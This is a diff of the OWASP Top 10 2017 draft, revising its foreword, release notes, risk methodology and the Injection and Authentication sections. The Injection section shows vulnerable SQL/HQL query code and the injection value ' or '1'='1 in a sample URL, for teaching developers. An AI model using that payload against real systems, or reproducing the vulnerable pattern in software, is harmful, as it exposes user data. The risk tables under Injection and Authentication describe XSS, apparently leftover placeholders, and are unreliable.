@@ -12,39 +12,59 @@
 </head>
 <body>
 <p><img src="images/OWASP_logo.png" alt="OWASP LOGO" /></p>
-<h2 id="owasp-top-10-2017-master-draft">OWASP Top 10 2017-master (DRAFT)</h2>
-<p>October 12 2017</p>
-<p>DRAFT STANDARD. DO NOT USE.</p>
-<h1 id="foreword-by-owasp-top-10-project-leadership">Foreword by OWASP Top 10 Project Leadership</h1>
-<p>TBA</p>
+<h2 id="owasp-top-10-2017-master-pre-rc2">OWASP Top 10 2017-master (pre-RC2)</h2>
+<p>October 15, 2017</p>
+<p>DRAFT STANDARD.</p>
+<p>Comments welcome - <a href="https://github.com/OWASP/Top10/issues" class="uri">https://github.com/OWASP/Top10/issues</a></p>
+<h1 id="important-notice">Important Notice</h1>
+<p>This version is not a final draft.</p>
+<p>We have worked extensively to validate the methodology, obtained a great deal of data on over 114,000 apps, and obtained qualitive data via survey by 550 community members on the two new categories - deserialization and insufficient logging and monitoring.</p>
+<p>We strongly urge for any corrections or issues to be logged at GitHub</p>
+<ul>
+<li><a href="https://github.com/OWASP/Top10/issues" class="uri">https://github.com/OWASP/Top10/issues</a></li>
+</ul>
+<p>Through public transparency, we provide traceability and ensure that all voices are heard during this final month before publication.</p>
+<ul>
+<li>Andrew van der Stock</li>
+<li>Brian Glas</li>
+<li>Neil Smithline</li>
+<li><p>Torsten Gigler</p>
+<h1 id="toc">TOC</h1></li>
+</ul>
+<h1 id="o-about-owasp">O About OWASP</h1>
+<h2 id="foreword">Foreword</h2>
+<p>Insecure software is undermining our financial, healthcare, defense, energy, and other critical infrastructure. As our software becomes increasingly critical, complex, and connected, the difficulty of achieving application security increases exponentially. The rapid pace of modern software development processes makes risks even more critical to discover quickly and accurately. We can no longer afford to tolerate relatively simple security problems like those presented in this OWASP Top 10.</p>
+<p>Although the original goal of the OWASP Top 10 project was simply to raise awareness amongst developers, it has become the de facto application security standard. The first release candidate received a great deal of push back, which caused a leadership change, involving the community in re-evaluating what the OWASP Top 10 <em>is</em>, the methodology, the data collection and analysis, and how we provide transparency and governance over the project. Most of all, the push back showed us how much passion the community has for the OWASP Top 10, and thus how critical it is for OWASP to get the Top 10 right for the majority of use cases.</p>
+<p>We have taken steps in this release to firm up the definition of issues, and improve the recommendations to be leading practices that may be adopted as a standard. We encourage larger and high performing organizations to use the <a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard</a> if a true standard is required, but for most, the OWASP Top 10 is a great start on the application security journey, and now it can be used as a standard for the first time as a supported goal.</p>
+<p>Since 2010 the Top 10 have been prioritized by risk, not just by prevalence or any other single metric or factor. In this latest version, we have continued to rank issues by risk based upon community feedback. Our risk model takes in exploitability, pervasiveness based upon 114,000 apps, detectability and technical impact, as measured by recent breaches. You may want to add your own business impacts to each of the OWASP Top 10, and so we encourage internal forking of the OWASP Top 10 to help your appsec program align with ISO 31000 and business imperiatives, as well as improve the recommendations to align with your architecture, platform and integrations. All of our materials are freely available on GitHub, including the data, so please use the OWASP Top 10 rather than try to craft your own internal checklists.</p>
+<p>In the long term, we encourage you to create an application security program that is compatible with your culture and technology. These programs come in all shapes and sizes, and you should avoid attempting to do everything prescribed in some process model. Instead, leverage your organization's existing strengths to do and measure what works for you.</p>
+<p>We hope that the OWASP Top 10 is useful to your application security efforts. Please don't hesitate to contact OWASP with your questions, comments, and ideas at our Github repo:</p>
+<ul>
+<li><a href="https://github.com/OWASP/Top10/issues" class="uri">https://github.com/OWASP/Top10/issues</a></li>
+</ul>
+<p>Lastly, we wish to thank the founding leadership of the OWASP Top 10 project, Dave Wichers and Jeff Williams for all their efforts, and believing in us to get this finished with the community's help. Thank you!</p>
 <ul>
 <li>Torsten Gigler</li>
 <li>Brian Glas</li>
 <li>Neil Smithline</li>
 <li>Andrew van der Stock</li>
 </ul>
-<h1 id="introduction">Introduction</h1>
-<h2 id="welcome">Welcome</h2>
-<p>Welcome to the OWASP Top 10 2017! This major update adds two new vulnerability categories for the first time: (1) Insufficient Attack Detection and Prevention and (2) Underprotected APIs. We made room for these two new categories by merging the two access control categories (2013-A4 and 2013-A7) back into Broken Access Control (which is what they were called in the OWASP Top 10 - 2004), and dropping 2013-A10: Unvalidated Redirects and Forwards, which was added to the Top 10 in 2010.</p>
-<p>The OWASP Top 10 for 2017 is based primarily on 11 large datasets from firms that specialize in application security, including 8 consulting companies and 3 product vendors. This data spans vulnerabilities gathered from hundreds of organizations and over 50,000 real-world applications and APIs. The Top 10 items are selected and prioritized according to this prevalence data, in combination with consensus estimates of exploitability, detectability, and impact.</p>
-<p>The primary aim of the OWASP Top 10 is to educate developers, designers, architects, managers, and organizations about the consequences of the most important web application security weaknesses. The Top 10 provides basic techniques to protect against these high risk problem areas – and also provides guidance on where to go from here.</p>
-<h2 id="warnings">Warnings</h2>
-<p>Don’t stop at 10. There are hundreds of issues that could affect the overall security of a web application as discussed in the OWASP Developer’s Guide and the OWASP Cheat Sheet Series. These are essential reading for anyone developing web applications and APIs. Guidance on how to effectively find vulnerabilities in web applications and APIs is provided in the OWASP Testing Guide and the OWASP Code Review Guide.</p>
-<p>Constant change. This Top 10 will continue to change. Even without changing a single line of your application’s code, you may become vulnerable as new flaws are discovered and attack methods are refined. Please review the advice at the end of the Top 10 in “What’s Next For Developers, Verifiers, and Organizations” for more information.</p>
-<p>Think positive. When you’re ready to stop chasing vulnerabilities and focus on establishing strong application security controls, OWASP is maintaining and promoting the Application Security Verification Standard (ASVS) as a guide to organizations and application reviewers on what to verify.</p>
-<p>Use tools wisely. Security vulnerabilities can be quite complex and buried in mountains of code. In many cases, the most cost-effective approach for finding and eliminating these weaknesses is human experts armed with good tools.</p>
-<p>Push left, right, and everywhere. Focus on making security an integral part of your culture throughout your development organization. Find out more in the OWASP Software Assurance Maturity Model (SAMM) and the Rugged Handbook.</p>
-<h2 id="attribution">Attribution</h2>
-<p>Thanks to Aspect Security for initiating, leading, and updating the OWASP Top 10 since its inception in 2003, and to its primary authors: Jeff Williams and Dave Wichers.</p>
-<p>We’d like to thank the many organizations that contributed their vulnerability prevalence data to support the 2017 update, including these large data set providers:</p>
-<p>Aspect Security, AsTech Consulting, Branding Brand, Contrast Security, EdgeScan, iBLISS, Minded Security, Paladion Networks, Softtek, Vantage Point, Veracode</p>
-<p>For the first time, all the data contributed to a Top 10 release, and the full list of contributors, is publicly available.</p>
-<p>We would like to thank in advance those who contribute significant constructive comments and time reviewing this update to the Top 10 and to:</p>
+<h2 id="about-owasp">About OWASP</h2>
+<p>The Open Web Application Security Project (OWASP) is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted. At OWASP you'll find free and open ...</p>
 <ul>
-<li>Neil Smithline – Generating the Wiki version</li>
-<li>Torsten Gigler - German translation</li>
+<li>Application security tools and standards</li>
+<li>Complete books on application security testing, secure code development, and secure code review</li>
+<li>Standard security controls and libraries</li>
+<li>Local chapters worldwide</li>
+<li>Cutting edge research</li>
+<li>Extensive conferences worldwide</li>
+<li>Mailing lists</li>
 </ul>
-<p>And finally, we’d like to thank in advance all the translators out there that will translate this release of the Top 10 into numerous different languages, helping to make the OWASP Top 10 more accessible to the entire planet.</p>
+<p>Learn more at: <a href="https://www.owasp.org" class="uri">https://www.owasp.org</a></p>
+<p>All of the OWASP tools, documents, forums, and chapters are free and open to anyone interested in improving application security. We advocate approaching application security as a people, process, and technology problem, because the most effective approaches to application security require improvements in all of these areas.</p>
+<p>OWASP is a new kind of organization. Our freedom from commercial pressures allows us to provide unbiased, practical, cost-effective information about application security. OWASP is not affiliated with any technology company, although we support the informed use of commercial security technology. Similar to many open source software projects, OWASP produces many types of materials in a collaborative, open way.</p>
+<p>The OWASP Foundation is the non-profit entity that ensures the project's long-term success. Almost everyone associated with OWASP is a volunteer, including the OWASP Board, Chapter Leaders, Project Leaders, and project members. We support innovative security research with grants and infrastructure.</p>
+<p>Come join us!</p>
 <h2 id="copyright-and-license">Copyright and License</h2>
 <p><img src="images/license.png" alt="license" /></p>
 <p>Copyright © 2003-2017 The OWASP Foundation. This document is released under the Creative Commons Attribution ShareAlike 3.0 license. For any reuse or distribution, you must make clear to others the license terms of this work.</p>
@@ -66,49 +86,107 @@
 </tbody>
 </table>
 <p>Project Leads, OWASP Top 10 2017 to RC1</p>
-<table>
+<p>| Project Leads | Lead Authors | Contributors and Reviewers |<br />
+| --- | --- | --- |<br />
+| Dave Wichers | Dave Wichers, Jeff Williams | TBA |</p>
+<h1 id="introduction">Introduction</h1>
+<h2 id="welcome">Welcome</h2>
+<p>Welcome to the OWASP Top 10 2017! This major update adds several new issues, including two issues selected by the community - A8:2017 Deserialization and A10:2017 Insufficient logging and monitoring. Community feedback also drove the collection of the most amount of data ever assembled in the preparation of an application security standard, and so we are confident that the remaining 8 issues are the most important for organizations to address, particularly the A3: Exposure of Sensitive Data in the age of the EU's General Data Protection Regulation, A5:2017 Misconfiguration especially around cloud and API services, and A9:2017 Known Vulnerabilities, which can be especially challenging for those on modern platforms, like node.js.</p>
+<p>The OWASP Top 10 for 2017 is based primarily on TBA large datasets from firms that specialize in application security, including TBA consulting companies and TBA product vendors. This data spans vulnerabilities gathered from hundreds of organizations and over 114,000 real-world applications and APIs. The Top 10 items are selected and prioritized according to this prevalence data, in combination with consensus estimates of exploitability, detectability, and impact.</p>
+<p>A primary aim of the OWASP Top 10 is to educate developers, designers, architects, managers, and organizations about the consequences of the most common and most important web application security weaknesses. The Top 10 provides basic techniques to protect against these high risk problem areas – and also provides guidance on where to go from here.</p>
+<h2 id="warnings">Warnings</h2>
+<p><strong>Don't stop at 10</strong>. There are hundreds of issues that could affect the overall security of a web application as discussed in the <a href="https://www.owasp.org/index.php/OWASP_Guide_Project">OWASP Developer's Guide</a> and the <a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">OWASP Cheat Sheet Series</a>. These are essential reading for anyone developing web applications and APIs. Guidance on how to effectively find vulnerabilities in web applications and APIs is provided in the OWASP Testing Guide and the OWASP Code Review Guide.</p>
+<p><strong>Constant change</strong>. The OWASP Top 10 will continue to change. Even without changing a single line of your application's code, you may become vulnerable as new flaws are discovered and attack methods are refined. Please review the advice at the end of the Top 10 in “What's Next For Developers, Verifiers, and Organizations” for more information.</p>
+<p><strong>Think positive</strong>. When you're ready to stop chasing vulnerabilities and focus on establishing strong application security controls, OWASP is maintaining and promoting the <a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard (ASVS)</a> as a guide to organizations and application reviewers on what to verify.</p>
+<p><strong>Use tools wisely</strong>. Security vulnerabilities can be quite complex and buried in mountains of code. In many cases, the most cost-effective approach for finding and eliminating these weaknesses is human experts armed with good tools.</p>
+<p><strong>Push left, right, and everywhere</strong>. Focus on making security an integral part of your culture throughout your development organization. Find out more in the <a href="">OWASP Software Assurance Maturity Model (OpenSAMM)</a>.</p>
+<h2 id="attribution">Attribution</h2>
+<p>We'd like to thank the many organizations that contributed their vulnerability prevalence data to support the 2017 update, including these large data set providers:</p>
+<ul>
+<li>Aspect Security, AsTech Consulting, Branding Brand, Contrast Security, EdgeScan, iBLISS, Minded Security, Paladion Networks, Softtek, Vantage Point, Veracode</li>
+</ul>
+<p>For the first time, all the data contributed to a Top 10 release, and the full list of contributors, is publicly available.</p>
+<p>We would like to thank in advance those who contribute significant constructive comments and time reviewing this update to the Top 10 and to:</p>
+<ul>
+<li>TBA (List of contributors from GitHub issues)</li>
+</ul>
+<p>And finally, we'd like to thank in advance all the translators out there that will translate this release of the Top 10 into numerous different languages, helping to make the OWASP Top 10 more accessible to the entire planet.</p>
+<h1 id="rn-release-notes">RN Release Notes</h1>
+<h2 id="what-changed-from-2013-to-2017">What changed from 2013 to 2017?</h2>
+<p>Over the last decade, and in particularly these last few years, the fundamental architecture of applications has changed significantly:</p>
+<ul>
+<li>JavaScript is now the primary language of the web. node.js and modern web frameworks such as Bootstrap, Electron, Angular, React amongst many others, means source that was once on the server is now running on untrusted browsers.</li>
+<li>Single page applications. Modern frameworks such as Angular and React allow the creation of highly modular front end user experiences, which integrate with...</li>
+<li>microservices. Older enterprise service bus applications using EJBs and so on, have been ported to node.js and Spring Boot microservices. Old code that never expected to be communicated directly from the Internet is now an API or RESTful web service. The assumptions that underlie this code, such as trusted callers, is simply not valid.</li>
+</ul>
+<p>Change has accelerated over the last five years, and the OWASP Top 10 needed to change. We've completely refactored the OWASP Top 10, revamped the methodology, tested a new data call process, worked with the community, re-ordered our risks, re-written each risk from the ground up, and added in modern references to frameworks and languages that are now commonly used.</p>
+<p>In this 2017 release, we made the following changes:</p>
+<table style="width:8%;">
+<colgroup>
+<col style="width: 4%" />
+<col style="width: 4%" />
+</colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Project Leads</th>
-<th style="text-align: left;">Lead Authors</th>
-<th style="text-align: left;">Contributors and Reviewers</th>
+<th style="text-align: left;">OWASP Top 10 2013</th>
+<th style="text-align: left;">OWASP Top 10 2017</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">Dave Wichers</td>
-<td style="text-align: left;">Dave Wichers, Jeff Williams</td>
-<td style="text-align: left;">TBA</td>
+<td style="text-align: left;">A1 - Injection</td>
+<td style="text-align: left;">A1:2017 Injection</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">A2 - Broken authentication and session management</td>
+<td style="text-align: left;">A2:2017 Authentication</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">A3 - Cross-site scripting</td>
+<td style="text-align: left;">A3:2017 Sensitive Information Disclosure</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">A4 - Insecure direct object references</td>
+<td style="text-align: left;">A4:2017 XML External Entities (NEW)</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">A5 - Security Misconfiguration</td>
+<td style="text-align: left;">A5:2017 Security Misconfiguration</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">A6 - Sensitive Data Exposure</td>
+<td style="text-align: left;">A6:2017 Access Control</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">A7 - Missing Function Level Access Control</td>
+<td style="text-align: left;">A7:2017 XSS</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">A8 - Cross-site Request Forgery (CSRF)</td>
+<td style="text-align: left;">A8:2017 Deserialization (New, Community)</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">A9 - Known Vulnerabilities</td>
+<td style="text-align: left;">A9:2017 Known Vulnerabilities</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">A10 - Unvalidated redirects and forwards</td>
+<td style="text-align: left;">A10:2017 Insufficient Logging and Monitoring (NEW, Community)</td>
 </tr>
 </tbody>
 </table>
-<h2 id="about-owasp">About OWASP</h2>
-<p>The Open Web Application Security Project (OWASP) is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted. At OWASP you’ll find free and open ...</p>
+<p>NB: Although most of these issues are weaknesses, the last one is missing or ineffective controls. It has two CWE entries, but in this case, not only did the community rank this issue, we felt if we didn't include detection and response in the OWASP Top 10 2017, we'd be negligent in our duties to the wider development community. With firewalls, logging, network IPS and endpoint protection systems unable to detect web hacks, it falls on web apps themselves to be the new firewall, especially for cloud-based microservices, where there is no firewall, no IPS, and no end points.</p>
+<h2 id="new-issues-supported-by-data">New issues, supported by data</h2>
+<p>XXE is a new category primarily supported by SAST data sets, but when discovered by penetration testers and dynamic tools, this new issue allows attackers to disclose internal information, scan internal systems, and possibly perform denial of service attacks.</p>
+<h2 id="new-issues-supported-by-the-community">New issues, supported by the community</h2>
+<p>We asked the community to provide insight into two forward looking weakness categories. After 550 peer submissions, and after removing issues that were already supported by data (such as Sensitive Data Exposure and XXE), the two new issues are A8:2017 Deserialization, responsible for one of the worst breaches of all time, and A10:2017 Insufficient Logging and Monitoring, the lack of which can prevent or significantly delay malicious activity and breach detection, incident response and digital forensics.</p>
+<h2 id="retired-but-not-forgotten">Retired, but not forgotten</h2>
 <ul>
-<li>Application security tools and standards</li>
-<li>Complete books on application security testing, secure code development, and secure code review</li>
-<li>Standard security controls and libraries</li>
-<li>Local chapters worldwide</li>
-<li>Cutting edge research</li>
-<li>Extensive conferences worldwide</li>
-<li>Mailing lists</li>
+<li><strong>A4 Insecure direct object references</strong> and A7 Missing function level access control. We have merged these two issues into a single access control finding, as the impacts and prevention recommendations are more or less identical. This allows us to free up an additional issue, which is XXE.</li>
+<li><strong>A8 CSRF</strong> - After being inserted with little data in the OWASP Top 10 2007, when 100% of applications were vulnerable to CSRF, the OWASP Top 10 has served its purpose by including this issue, and it now is found in less than 2% of all applications.</li>
+<li><strong>A10 Unvalidated redirects and forwards</strong>. Although this issue is a relative of XSS, and injections more broadly, the actual CWE issue has fallen out of the 10 positions available. As this issue is automatically detected by both DAST and SAST tools, we encourage organizations and vendors to keep on reporting on this issue.</li>
 </ul>
-<p>Learn more at: <a href="https://www.owasp.org" class="uri">https://www.owasp.org</a></p>
-<p>All of the OWASP tools, documents, forums, and chapters are free and open to anyone interested in improving application security. We advocate approaching application security as a people, process, and technology problem, because the most effective approaches to application security require improvements in all of these areas.</p>
-<p>OWASP is a new kind of organization. Our freedom from commercial pressures allows us to provide unbiased, practical, cost-effective information about application security. OWASP is not affiliated with any technology company, although we support the informed use of commercial security technology. Similar to many open source software projects, OWASP produces many types of materials in a collaborative, open way.</p>
-<p>The OWASP Foundation is the non-profit entity that ensures the project’s long-term success. Almost everyone associated with OWASP is a volunteer, including the OWASP Board, Chapter Leaders, Project Leaders, and project members. We support innovative security research with grants and infrastructure.</p>
-<p>Come join us!</p>
 <h1 id="f-details-about-risk-factors">+F Details about Risk factors</h1>
-<h2 id="about-risks">About risks</h2>
-<p>During the creation of the OWASP Top 10 2017, we asked the community how they would like the issues to be presented. The overwhelming majority of respondants asked for risk-based ranking. It would be simpler for us to use prevalance only, or breach only ordering, because we have solid access data on that, but then we wouldn't be presenting risks.</p>
-<p>ISO 31000 is the international standard for risk management. We aim to adhere to that standard, but we only include technical impact, and not business impact. Every organization adopting the OWASP Top 10 will need to add their business impact to our calculations. Why is this important? Consider the case where a CMS is used as a public website by one organization, and as a health records system by another. The data asset, risks and threats are very different, and yet the software is the same.</p>
-<p>We present three likelihood factors:</p>
-<ul>
-<li>Exploitability - based upon our combined experience of if the issue is difficult to exploit requiring advanced skills uncommon in the industry, average, or easy (automated)</li>
-<li>Prevalence - comes unmodified from the 114,000 application data set</li>
-<li>Detectability - difficult or blind, average or easy (automated) detection</li>
-</ul>
-<p>Impact is purely a technical impact, which we based upon our experience, history of breaches using this issue, and sources such as the Verizon Data Breach Incident Report.</p>
 <h2 id="top-10-risk-factor-summary">Top 10 Risk Factor Summary</h2>
 <p>The following table presents a summary of the 2017 Top 10 Application Security Risks, and the risk factors we have assigned to each risk. These factors were determined based on the available statistics and the experience of the OWASP Top 10 team.</p>
 <table>
@@ -233,6 +311,16 @@
 <li><a href="https://cwe.mitre.org/data/definitions/915.html">Mass Assignment (CWE-915)</a></li>
 </ul>
 <h1 id="r-about-risks">+R About Risks</h1>
+<h2 id="about-risks">About risks</h2>
+<p>During the creation of the OWASP Top 10 2017, we asked the community how they would like the issues to be presented. The overwhelming majority of respondants asked for risk-based ranking. It would be simpler for us to use prevalance only, or breach only ordering, because we have solid access data on that, but then we wouldn't be presenting risks.</p>
+<p>ISO 31000 is the international standard for risk management. We aim to adhere to that standard, but we only include technical impact, and not business impact. Every ISO 31000 compliant organization adopting the OWASP Top 10 should add their business impact to our calculations. Why is this important? Consider the case where a CMS is used as a public website by one organization, and as a health records system by another. The data asset, risks and threats are very different, and yet the software is the same.</p>
+<p>We present three likelihood factors:</p>
+<ul>
+<li>Exploitability - based upon our combined experience of if the issue is difficult to exploit requiring advanced skills uncommon in the industry, average, or easy (automated)</li>
+<li>Prevalence - comes unmodified from the 114,000 application data set</li>
+<li>Detectability - difficult or blind, average or easy (automated) detection</li>
+</ul>
+<p>Impact is purely a technical impact, which we based upon our experience, history of breaches using this issue, and reputable sources such as the annual Verizon Data Breach Incident Report.</p>
 <h2 id="defining-our-terms">Defining our terms</h2>
 <p>One of the long standing tensions within the information security industry is the misunderstanding or misuse of common terms, such as threats, threat agents, weaknesses, defects, flaws, vulnerabilities, and risks. As such, we are defining our terms to ensure that there is no confusion.</p>
 <table style="width:11%;">
@@ -277,18 +365,9 @@
 </tr>
 </tbody>
 </table>
-<p>The ISO standard for Risk Management is ISO 31000, which defines risks as likelihood x impact. Risk managers worldwide use this working definition to triage, prioritize, and mitigate, transfer or accept risks to the organization.</p>
-<p>As no two applications has the same business requirements, is likely built very differently, and integrated with different systems, it's impossible to define a universal impact that would be valid under ISO 31000. Even the same application, such as a CMS would have very different impacts depending on the data assets processed or stored within the CMS. For example, a public wiki containing non-confidential information might need integrity controls, but has no intrinsic value, and thus the disclosure of inforamtion from the wiki is desirable rather than a risk. However, if this same software was used to store sensitive medical records, the data asset has attached legal, privacy and regulatory protection that requires data to be encrypted and access to be audited. Any data leak, tampering or data loss would be a critical risk to the organization.</p>
-<p>So how do we judge risks in the ISO 31000 context? Simply, we can't. However, to assist organizations, we use our judgement based upon past experience in the finance, health, government, mining, logistics and other fields to give a rough estimate as to a baseline likelihood and baseline impact.</p>
-<p>These baselines are derived in two ways:</p>
-<ul>
-<li><p>Through a data call, which analyzes real world security test results</p></li>
-<li><p>Through a survey of over 500 security professionals</p></li>
-</ul>
-<p>We use these results to inform the OWASP Top 10 regarding likelihood, and we inspect data breach databases to determine typical breach impacts resulting from that type of vulnerability.</p>
-<p>Our methodology includes three likelihood factors for each weakness (prevalence, detectability, and ease of exploit) and one impact factor (technical impact). The prevalence of a weakness is a factor that you typically don’t have to calculate. For prevalence data, we have been supplied prevalence statistics from a number of different organizations (as referenced in the Attribution section on page 4) and we have averaged their data together to come up with a Top 10 likelihood of existence list by prevalence. This data was then combined with the other two likelihood factors (detectability and ease of exploit) to calculate a likelihood rating for each weakness. The likelihood rating was then multiplied by our estimated average technical impact for each item to come up with an overall risk ranking for each item in the Top 10.</p>
+<p>Our methodology includes three likelihood factors for each weakness (prevalence, detectability, and ease of exploit) and one impact factor (technical impact). The prevalence of a weakness is a factor that you typically don't have to calculate. For prevalence data, we have been supplied prevalence statistics from a number of different organizations (as referenced in the Attribution section on page 4) and we have averaged their data together to come up with a Top 10 likelihood of existence list by prevalence. This data was then combined with the other two likelihood factors (detectability and ease of exploit) to calculate a likelihood rating for each weakness. The likelihood rating was then multiplied by our estimated average technical impact for each item to come up with an overall risk ranking for each item in the Top 10.</p>
 <p>Note that this approach does not take the likelihood of the threat agent into account. Nor does it account for any of the various technical details associated with your particular application. Any of these factors could significantly affect the overall likelihood of an attacker finding and exploiting a particular vulnerability. This rating also does not take into account the actual impact on your business. Your organization will have to decide how much security risk from applications and APIs the organization is willing to accept given your culture, industry, and regulatory environment. The purpose of the OWASP Top 10 is not to do this risk analysis for you.</p>
-<p>The following illustrates our calculation of the risk for A3: Cross-Site Scripting, as an example. XSS is so prevalent it warranted the only ‘VERY WIDESPREAD’ prevalence value of 0. All other risks ranged from widespread to uncommon (value 1 to 3).</p>
+<p>The following illustrates our calculation of the risk for A5:2017 Security Misconfiguration, as an example. Misconfiguration is so prevalent it warranted the only 'PREVALENT' prevalence value of 4. All other risks ranged from uncommon to common (values 1 to 3).</p>
 <h1 id="a1-injections">A1 Injections</h1>
 <table style="width:33%;">
 <colgroup>
@@ -328,6 +407,57 @@
 </tr>
 </tbody>
 </table>
+<table style="width:12%;">
+<colgroup>
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The threat agent is app specific, and depends on access, motive, and goals against the data asset.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">EASY (3)</td>
+<td style="text-align: left;">Automated tools can exploit all three forms of XSS, and there are freely available exploitation frameworks.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
+<td style="text-align: left;">WIDESPREAD (3)</td>
+<td style="text-align: left;">XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">EASY (3)</td>
+<td style="text-align: left;">XSS can be discovered by SAST and DAST tools, as well as anyone with a browser.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">MODERATE (2)</td>
+<td style="text-align: left;">The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">6.0</td>
+<td style="text-align: left;">MEDIUM</td>
+</tr>
+</tbody>
+</table>
 <h2 id="am-i-vulnerable-to-attack">Am I vulnerable to attack?</h2>
 <p>The best way to find out if an application is vulnerable to injection is to verify that all use of interpreters clearly separates untrusted data from the command or query. In many cases, it is recommended to avoid the interpreter, or disable it (e.g., XXE), if possible. For SQL calls, use bind variables in all prepared statements and stored procedures, or avoid dynamic queries.</p>
 <p>Checking the code is a fast and accurate way to see if the application uses interpreters safely. Code analysis tools can help a security analyst find use of interpreters and trace data flow through the application. Penetration testers can validate these issues by crafting exploits that confirm the vulnerability.</p>
@@ -336,15 +466,15 @@
 <p>Preventing injection requires keeping untrusted data separate from commands and queries.</p>
 <ol>
 <li><p>The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface. Be careful with APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood.</p></li>
-<li><p>If (1) is not available, you should escape special characters using the specific escape syntax for that interpreter. OWASP’s Java Encoder and similar libraries provide such escaping routines.</p></li>
-<li><p>Positive or “white list” input validation is also recommended, but is not a complete defense as many situations require special characters be allowed. If special characters are required, only approaches (1) and (2) above will make their use safe.</p></li>
+<li><p>If (1) is not available, you should escape special characters using the specific escape syntax for that interpreter. OWASP's Java Encoder and similar libraries provide such escaping routines.</p></li>
+<li><p>Positive or &quot;white list&quot; input validation is also recommended, but is not a complete defense as many situations require special characters be allowed. If special characters are required, only approaches (1) and (2) above will make their use safe.</p></li>
 </ol>
 <h2 id="example-scenarios">Example Scenarios</h2>
 <p>Scenario #1: An application uses untrusted data in the construction of the following vulnerable SQL call:</p>
 <p><code>String query = &quot;SELECT * FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;;</code></p>
-<p>Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)):</p>
+<p>Scenario #2: Similarly, an application's blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)):</p>
 <p><code>Query HQLQuery = session.createQuery(&quot;FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;);</code></p>
-<p>In both cases, the attacker modifies the ‘id’ parameter value in her browser to send: <code>' or '1'='1</code>. For example:</p>
+<p>In both cases, the attacker modifies the 'id' parameter value in her browser to send: <code>' or '1'='1</code>. For example:</p>
 <p><code>http://example.com/app/accountView?id=' or '1'='1</code></p>
 <p>This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify data or even invoke stored procedures.</p>
 <h2 id="references">References</h2>
@@ -368,37 +498,16 @@
 <li>Do we have a non-vendor reference for this? <a href="https://portswigger.net/knowledgebase/issues/details/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a></li>
 </ul>
 <h1 id="a2-authentication-and-session-management">A2 Authentication and Session Management</h1>
-<table style="width:33%;">
-<colgroup>
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-</colgroup>
-<thead>
-<tr class="header">
-<th style="text-align: left;">Threat agents</th>
-<th style="text-align: left;">Exploitability</th>
-<th style="text-align: left;">Prevalance</th>
-<th style="text-align: left;">Detectability</th>
-<th style="text-align: left;">Technical Impact</th>
-<th style="text-align: left;">Business Impacts</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: left;">App Specific</td>
-<td style="text-align: left;">3</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">3</td>
-<td style="text-align: left;">App Specific</td>
-</tr>
-</tbody>
-</table>
-<p>This issue is easily exploitable by manual means using freely available off the self tools and techniques. This issue is found in 40% of all assessments. The impact of exploitation is compromise of at least one targeted account, and often millions of accounts for undirected attacks.</p>
+<p>| Factor | Score | Description |<br />
+| -- | -- | -- |<br />
+| Threat agent | ? | The threat agent is app specific, and depends on access, motive, and goals against the data asset. |<br />
+| Exploitability | EASY (3) | Automated tools can exploit all three forms of XSS, and there are freely available exploitation frameworks. |<br />
+| Prevalence | WIDESPREAD (3) | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. |<br />
+| Detectability | EASY (3) | XSS can be discovered by SAST and DAST tools, as well as anyone with a browser. |<br />
